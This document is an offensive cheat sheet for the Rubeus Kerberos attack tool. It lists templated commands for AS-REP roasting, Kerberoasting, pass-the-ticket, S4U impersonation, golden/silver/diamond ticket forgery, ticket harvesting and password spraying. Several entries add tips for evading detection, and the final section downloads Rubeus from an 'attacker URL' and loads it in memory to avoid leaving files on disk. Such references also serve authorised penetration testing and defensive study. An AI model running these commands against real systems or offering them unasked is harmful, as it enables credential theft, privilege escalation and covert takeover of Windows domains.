# Rubeus

## Rubeus - asreproast

### ASREPRoast user to file

ASREPRoast a single user and save the AS-REP hash to disk for offline cracking.

```sh title:"ASREPRoast one user, save hash to file"
.\Rubeus.exe asreproast /user:$user /domain:$domain /dc:$rhost_name /nowrap /outfile:hashes.txt
```
<!-- cheat
var user
var domain
var rhost_name
-->

### ASREPRoast hashcat format

Same single-user ASREPRoast but emit the hash already in hashcat 18200 format.

```sh title:"ASREPRoast one user in hashcat 18200 format"
.\Rubeus.exe asreproast /user:$user /nowrap /format:hashcat
```
<!-- cheat
var user
-->

## Rubeus - kerberoast

### Kerberoast stats

Print Kerberoast stats only (account counts, encryption types) without requesting tickets. Quick scope check.

```sh title:"Print Kerberoast stats only, no tickets requested"
.\Rubeus.exe kerberoast /stats
```
<!-- cheat -->

### Kerberoast adminCount=1

Restrict roast to AdminSDHolder-protected accounts. Highest-value targets only.

```sh title:"Restrict roast to AdminSDHolder-protected users"
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```
<!-- cheat -->

### Kerberoast one user

Targeted Kerberoast against a named user.

```sh title:"Targeted Kerberoast against named user"
.\Rubeus.exe kerberoast /user:$user /nowrap
```
<!-- cheat
var user
-->

### Kerberoast all SPNs

Bulk Kerberoast every SPN-enabled account in the domain.

```sh title:"Bulk Kerberoast every SPN-enabled account"
.\Rubeus.exe kerberoast /nowrap
```
<!-- cheat -->

### Kerberoast no preauth

Roast a target via the no-preauth path (DONT_REQ_PREAUTH set). Works without valid creds, given the target's SPN.

```sh title:"Roast via no-preauth path, no creds required"
.\Rubeus.exe kerberoast /nopreauth:$user /domain:$domain /spn:$spn /nowrap
```
<!-- cheat
var user
var domain
var spn
-->

### Kerberoast cross-domain

Targeted roast against a user in a specific domain (cross-trust scenarios).

```sh title:"Targeted roast across trust into specific domain"
.\Rubeus.exe kerberoast /user:$user /domain:$domain /nowrap
```
<!-- cheat
var user
var domain
-->

## Rubeus - asktgt

### TGT from RC4 + PTT

Request a TGT using the user's RC4 hash and inject it into the current session in one step.

```sh title:"Request TGT with RC4 hash and inject into session"
.\Rubeus.exe asktgt /rc4:$rc4_hash /user:$user /ptt
```
<!-- cheat
var rc4_hash
var user
-->

### TGT from password

Request a TGT with a cleartext password, output `.kirbi` (no PTT). Useful for relay-style flows where the ticket is consumed elsewhere.

```sh title:"Request TGT with password, no PTT (output .kirbi)"
.\Rubeus.exe asktgt /user:$user /password:$pass /domain:$domain /dc:$rhost_name /nowrap
```
<!-- cheat
var user
var pass
var domain
var rhost_name
-->

### TGT via PKINIT

PKINIT TGT request using a certificate (PFX) and its password. `/getcredentials` returns the user's NT hash.

```sh title:"PKINIT TGT via PFX cert + password, /getcredentials returns NT hash"
.\Rubeus.exe asktgt /user:$user /certificate:$certificate /password:"$pass" /domain:$domain /dc:$rhost_name /getcredentials /show /nowrap
```
<!-- cheat
var user
var certificate
var pass
var domain
var rhost_name
-->

### TGT with AES256 key

Request a TGT with an AES256 key instead of RC4. Prefer this when you have Kerberos keys and want to avoid RC4 downgrade telemetry.

```sh title:"Request TGT with AES256 key"
.\Rubeus.exe asktgt /user:$user /aes256:$aes256_key /domain:$domain /dc:$rhost_name /nowrap
```
<!-- cheat
var user
var aes256_key
var domain
var rhost_name
-->

### TGT into netonly process

Create a sacrificial net-only process and apply the TGT there so the current logon session's tickets are not clobbered.

```cmd title:"Request TGT and apply it to a new net-only cmd.exe"
.\Rubeus.exe asktgt /user:$user /aes256:$aes256_key /domain:$domain /createnetonly:C:\Windows\System32\cmd.exe /show
```
<!-- cheat
var user
var aes256_key
var domain
-->

### TGT without PAC

Request a TGT without a PAC. Useful for testing KDC behavior and reducing ticket size when PAC data is not needed.

```cmd title:"Request TGT without PAC"
.\Rubeus.exe asktgt /user:$user /password:$pass /domain:$domain /dc:$rhost_name /nopac /nowrap
```
<!-- cheat
var user
var pass
var domain
var rhost_name
-->

## Rubeus - s4u

### S4U2Self impersonate user

S4U2Self with `/altservice` to forge a usable service ticket as another user, then PTT.

```sh title:"S4U2Self for impersonated user, PTT result"
.\Rubeus.exe s4u /self /nowrap /impersonateuser:$user /altservice:$service /ptt /ticket:$ticket
```
<!-- cheat
var user
var service
var ticket
-->

### S4U2Proxy admin

S4U2Proxy chain to forge a service ticket as administrator on the named SPN, using a controlled account's RC4 hash.

```sh title:"S4U2Proxy ticket as administrator on named SPN"
.\Rubeus.exe s4u /impersonateuser:administrator /msdsspn:$msdsspn /altservice:$service /user:$user /rc4:$rc4_hash /ptt
```
<!-- cheat
var msdsspn
var service
var user
var rc4_hash
-->

### S4U admin no PTT

Same admin S4U chain but without PTT; gets you the ticket on disk for use elsewhere.

```sh title:"Admin S4U chain, no PTT, ticket to disk"
.\Rubeus.exe s4u /impersonateuser:administrator /msdsspn:$msdsspn /domain:$domain /user:$user /rc4:$rc4_hash /nowrap
```
<!-- cheat
var msdsspn
var domain
var user
var rc4_hash
-->

### S4U2Self admin via altservice

S4U2Self/altservice trick that forges a usable Administrator service ticket from a controlled account's TGT.

```sh title:"S4U2Self altservice trick to forge admin service ticket"
.\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:$service /dc:$rhost_name /ptt /ticket:$ticket
```
<!-- cheat
var service
var rhost_name
var ticket
-->

### S4U2Proxy self user

S4U2Proxy where the impersonated user is the same controlled user; useful in RBCD chains.

```sh title:"S4U2Proxy self-impersonation, RBCD chain step"
.\Rubeus.exe s4u /user:$user /rc4:$rc4_hash /impersonateuser:$user /msdsspn:$msdsspn /ptt
```
<!-- cheat
var user
var rc4_hash
var msdsspn
-->

### Netonly cmd

Spawn cmd.exe under a net-only sacrificial logon. Lets you load tickets into a clean LUID without touching the host token.

```sh title:"Net-only cmd.exe under sacrificial LUID for ticket loading"
.\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```
<!-- cheat -->

## Rubeus - ptt

### PTT from .kirbi

Inject a `.kirbi` ticket file into the current logon session.

```sh title:"Inject .kirbi ticket file into current session"
.\Rubeus.exe ptt /ticket:$ticket.kirbi
```
<!-- cheat
var ticket
-->

### PTT from base64

Inject a base64-encoded ticket into the current session. Avoids dropping a file on disk.

```sh title:"Inject base64-encoded ticket, no file on disk"
.\Rubeus.exe ptt /ticket:$ticket
```
<!-- cheat
var ticket
-->

### PTT into LUID

Inject a ticket into a specific logon session. Requires elevation and is commonly paired with `createnetonly`.

```cmd title:"Inject ticket into specific logon session"
.\Rubeus.exe ptt /luid:$luid /ticket:$ticket
```
<!-- cheat
var luid
var ticket
-->

### Purge tickets

Purge Kerberos tickets from the current logon session.

```cmd title:"Purge current session tickets"
.\Rubeus.exe purge
```
<!-- cheat -->

### Purge tickets from LUID

Purge Kerberos tickets from a specific logon session. Requires elevation.

```cmd title:"Purge tickets from specific LUID"
.\Rubeus.exe purge /luid:$luid
```
<!-- cheat
var luid
-->

### Describe ticket

Parse a `.kirbi` or base64 ticket and show ticket metadata. If the service key is known, Rubeus can decrypt and show PAC details.

```cmd title:"Describe a ticket"
.\Rubeus.exe describe /ticket:$ticket /nowrap
```
<!-- cheat
var ticket
-->

### Describe ticket with service key

Decrypt the ticket with the service key and display PAC details.

```cmd title:"Describe and decrypt ticket PAC"
.\Rubeus.exe describe /ticket:$ticket /servicekey:$service_key /nowrap
```
<!-- cheat
var ticket
var service_key
-->

### Triage tickets

List all tickets currently loaded in the session (LUID, target, encryption).

```sh title:"List all tickets in session (LUID/target/enc)"
.\Rubeus.exe triage
```
<!-- cheat -->

### Dump all accessible tickets

Dump Kerberos tickets from accessible logon sessions.

```cmd title:"Dump all accessible Kerberos tickets"
.\Rubeus.exe dump
```
<!-- cheat -->

### Detailed ticket list

Show detailed ticket information for the current or selected logon session.

```cmd title:"Detailed ticket list"
.\Rubeus.exe klist /luid:$luid
```
<!-- cheat
var luid
-->

## Rubeus

### Dump tickets

Dump tickets for a specific LUID and service. Targeted variant of `triage` + extract.

```sh title:"Dump tickets for specific LUID and service"
.\Rubeus.exe dump /luid:$luid /service:$service /nowrap
```
<!-- cheat
var luid
var service
-->

### Golden ticket

Forge a golden TGT with optional extra-SIDs (cross-forest impersonation).

```sh title:"Forge golden TGT, optional extra-SIDs for cross-forest"
.\Rubeus.exe golden /rc4:$rc4_hash /domain:$domain /sid:$sid /sids:$sids /user:$user /ptt
```
<!-- cheat
var rc4_hash
var domain
var sid
var sids
var user
-->

### Golden ticket via LDAP

Forge a golden ticket while letting Rubeus pull PAC fields from LDAP, then print a reusable command.

```cmd title:"Forge golden ticket with LDAP-populated PAC"
.\Rubeus.exe golden /aes256:$aes256_key /ldap /user:$user /domain:$domain /dc:$rhost_name /printcmd /ptt
```
<!-- cheat
var aes256_key
var user
var domain
var rhost_name
-->

### Silver ticket

Forge a service ticket for a target SPN using the service account key. Add `/krbkey` when you also have the krbtgt key and want PAC checksums to line up.

```cmd title:"Forge silver ticket for target service"
.\Rubeus.exe silver /rc4:$rc4_hash /user:$user /service:$spn /domain:$domain /sid:$sid /ptt
```
<!-- cheat
var rc4_hash
var user
var spn
var domain
var sid
-->

### Silver ticket via LDAP

Forge a service ticket with PAC fields populated from LDAP and a krbtgt key for stronger PAC signing.

```cmd title:"Forge LDAP-populated silver ticket"
.\Rubeus.exe silver /aes256:$aes256_key /user:$user /service:$spn /ldap /krbkey:$krbtgt_key /krbenctype:aes256 /domain:$domain /dc:$rhost_name /ptt
```
<!-- cheat
var aes256_key
var user
var spn
var krbtgt_key
var domain
var rhost_name
-->

### Diamond ticket

Request a real TGT, modify PAC fields, and re-sign it with the krbtgt key. This keeps the normal request pattern while changing the embedded identity.

```cmd title:"Forge diamond ticket from password"
.\Rubeus.exe diamond /krbkey:$krbtgt_key /user:$user /password:$pass /domain:$domain /dc:$rhost_name /ticketuser:$target_user /ticketuserid:$target_rid /groups:$group_rids /ptt
```
<!-- cheat
var krbtgt_key
var user
var pass
var domain
var rhost_name
var target_user
var target_rid
var group_rids
-->

### Diamond ticket via tgtdeleg

Use the `tgtdeleg` trick as the base ticket, then modify PAC fields with the krbtgt key.

```cmd title:"Forge diamond ticket from tgtdeleg"
.\Rubeus.exe diamond /krbkey:$krbtgt_key /tgtdeleg /ticketuser:$target_user /ticketuserid:$target_rid /groups:$group_rids /ptt
```
<!-- cheat
var krbtgt_key
var target_user
var target_rid
var group_rids
-->

### Watch for new TGTs

Monitor LSASS for new TGTs at a 5s interval. Used after coercing a target to a host you control to grab inbound tickets.

```sh title:"Watch LSASS for inbound TGTs every 5s"
.\Rubeus.exe monitor /interval:5 /nowrap
```
<!-- cheat -->

### Watch for target user's TGTs

Monitor for new TGTs belonging to a specific user or machine account.

```cmd title:"Watch for TGTs from one target user"
.\Rubeus.exe monitor /targetuser:$target_user /interval:$seconds /runfor:$runfor_seconds /nowrap
```
<!-- cheat
var target_user
var seconds
var runfor_seconds
-->

### Harvest and auto-renew TGTs

Maintain a cache of observed TGTs and renew them before expiry. Useful on unconstrained delegation hosts.

```cmd title:"Harvest and auto-renew observed TGTs"
.\Rubeus.exe harvest /monitorinterval:$monitor_seconds /displayinterval:$display_seconds /nowrap
```
<!-- cheat
var monitor_seconds
var display_seconds
-->

### Ask TGS

Request a TGS for a named service using an existing TGT and PTT.

```sh title:"Request TGS for named service from existing TGT"
.\Rubeus.exe asktgs /ticket:$ticket /service:$service /ptt
```
<!-- cheat
var ticket
var service
-->

### Ask TGS via current session

Request a service ticket through LSA using the current session TGT. This avoids supplying a ticket blob and makes traffic originate from LSASS.

```cmd title:"Request TGS through current logon session"
.\Rubeus.exe asktgs /service:$spn /nowrap
```
<!-- cheat
var spn
-->

### Ask TGS with forced enctype

Request a service ticket with a specific encryption type.

```cmd title:"Request TGS with chosen encryption type"
.\Rubeus.exe asktgs /ticket:$ticket /service:$spn /enctype:$enctype /dc:$rhost_name /nowrap
```
<!-- cheat
var ticket
var spn
var enctype
var rhost_name
-->

### Ask TGS user-to-user

Use U2U to request a PAC for a target user and inspect the result with `describe`.

```cmd title:"Request U2U ticket for target user's PAC"
.\Rubeus.exe asktgs /u2u /targetuser:$target_user /ticket:$ticket /tgs:$tgs /nowrap
```
<!-- cheat
var target_user
var ticket
var tgs
-->

### Renew ticket

Renew a TGT and inject it. Extends ticket lifetime when the original is about to expire.

```sh title:"Renew TGT and inject, extends ticket lifetime"
.\Rubeus.exe renew /ticket:$ticket /ptt
```
<!-- cheat
var ticket
-->

### Auto-renew ticket

Loop until the renew-till window expires, renewing the TGT before each end time.

```cmd title:"Auto-renew TGT until renew-till expires"
.\Rubeus.exe renew /ticket:$ticket /autorenew /nowrap
```
<!-- cheat
var ticket
-->

### TGS service substitution

Substitute the service in a TGS by rewriting the sname (silver ticket repurposing trick).

```sh title:"Rewrite sname to repurpose silver ticket for new service"
.\Rubeus.exe tgssub /ticket:$ticket /altservice:$service /nowrap
```
<!-- cheat
var ticket
var service
-->

### Hash password

Compute Kerberos keys (RC4, AES128, AES256) from a cleartext password for the specified user/domain.

```sh title:"Compute RC4/AES Kerberos keys from cleartext password"
.\Rubeus.exe hash /password:$pass /user:$user /domain:$domain
```
<!-- cheat
var pass
var user
var domain
-->

### Kerberos password spray

Spray a single password across users via Kerberos. `/noticket` suppresses successful TGT output.

```cmd title:"Kerberos password spray from user list"
.\Rubeus.exe brute /password:$pass /users:$users_file /domain:$domain /dc:$rhost_name /noticket
```
<!-- cheat
var pass
var users_file
var domain
var rhost_name
-->

### Kerberos brute one user

Try a password list against one user over Kerberos.

```cmd title:"Kerberos brute force one user"
.\Rubeus.exe brute /user:$user /passwords:$passwords_file /domain:$domain /dc:$rhost_name /noticket
```
<!-- cheat
var user
var passwords_file
var domain
var rhost_name
-->

### Pre-auth scan

Scan a user list for accounts that do not require Kerberos pre-authentication.

```cmd title:"Find AS-REP roastable users by pre-auth scan"
.\Rubeus.exe preauthscan /users:$users_file /domain:$domain /dc:$rhost_name
```
<!-- cheat
var users_file
var domain
var rhost_name
-->

### TGT delegation

Use the GSS-API delegation trick to retrieve a usable TGT for the current user without elevation.

```cmd title:"Retrieve usable current-user TGT via delegation"
.\Rubeus.exe tgtdeleg /target:$spn
```
<!-- cheat
var spn
-->

### Change password with ticket

Use an existing TGT or changepw ticket to reset a password through Kerberos.

```cmd title:"Change Kerberos password using ticket"
.\Rubeus.exe changepw /ticket:$ticket /new:$new_pass /dc:$rhost_name /targetuser:$domain\$user
```
<!-- cheat
var ticket
var new_pass
var rhost_name
var domain
var user
-->

### Current LUID

Print the current logon session ID.

```cmd title:"Show current logon session LUID"
.\Rubeus.exe currentluid
```
<!-- cheat -->

### Logon session details

Show logon session details for the current or selected LUID.

```cmd title:"Show logon session details"
.\Rubeus.exe logonsession /luid:$luid
```
<!-- cheat
var luid
-->

### Kerberoast RC4 only (OPSEC)

Skip AES-enabled accounts to avoid the 4769-A event ID flag that AES Kerberoasting raises in modern hunts.

```sh title:"Roast RC4-only accounts (skip noisy AES tickets)"
.\Rubeus.exe kerberoast /rc4opsec /outfile:$output_file
```
<!-- cheat
var output_file
-->

### Kerberoast AES only

Target AES-enabled accounts specifically. Slower to crack but bypasses some weak detection rules that only watch RC4.

```sh title:"Roast AES-only accounts (slower crack, lower RC4 telemetry)"
.\Rubeus.exe kerberoast /aes /outfile:$output_file
```
<!-- cheat
var output_file
-->

### Kerberoast specific user (simple)

Targeted roast in `/simple` output format - just the hash, no surrounding metadata.

```sh title:"Targeted roast in /simple hash-only output format"
.\Rubeus.exe kerberoast /user:$target_user /simple /outfile:$output_file
```
<!-- cheat
var target_user
var output_file
-->

## Rubeus - in-memory load

### Load from disk

Load Rubeus into the current PowerShell session via Reflection - no `Rubeus.exe` process spawn, runs in `powershell.exe`.

```powershell title:"Load Rubeus.exe into PS session via Reflection (no child process)"
[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes("$rubeus_path"))
```
<!-- cheat
var rubeus_path
-->

### Load from URL

Pull Rubeus from an attacker server and load into the current PS session - no disk drop.

```powershell title:"In-memory load Rubeus from attacker URL"
$data = (New-Object System.Net.WebClient).DownloadData('$scheme://$lhost:$lport/Rubeus.exe'); [System.Reflection.Assembly]::Load($data)
```
<!-- cheat
import tun_ip
import lports
import scheme
-->

### Invoke loaded Rubeus

After loading via Reflection, call into Rubeus.Program directly.

```powershell title:"Invoke loaded Rubeus.Program with split args"
[Rubeus.Program]::Main("$rubeus_cmd".Split())
```
<!-- cheat
var rubeus_cmd
-->
